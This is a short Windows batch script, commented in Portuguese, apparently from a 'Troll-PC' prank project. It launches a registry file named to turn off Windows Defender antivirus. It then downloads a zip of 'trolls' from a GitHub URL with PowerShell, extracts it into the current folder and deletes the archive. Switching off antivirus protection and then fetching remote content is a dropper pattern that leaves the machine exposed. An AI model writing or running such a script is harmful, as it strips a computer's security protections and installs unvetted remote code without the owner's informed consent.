@echo off
setlocal

start Turn_Off_Windows_Defender_Antivirus.reg

:: Baixar o arquivo usando PowerShell
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/FalcaoOtavio/Troll-PC/main/download-trolls.zip' -OutFile 'download-trolls.zip'"

:: Extrair o conteúdo do arquivo ZIP no diretório atual
powershell -Command "Expand-Archive -Path 'download-trolls.zip' -DestinationPath . -Force"

:: Remover o arquivo ZIP após extração
del download-trolls.zip

endlocal
exit /b 0
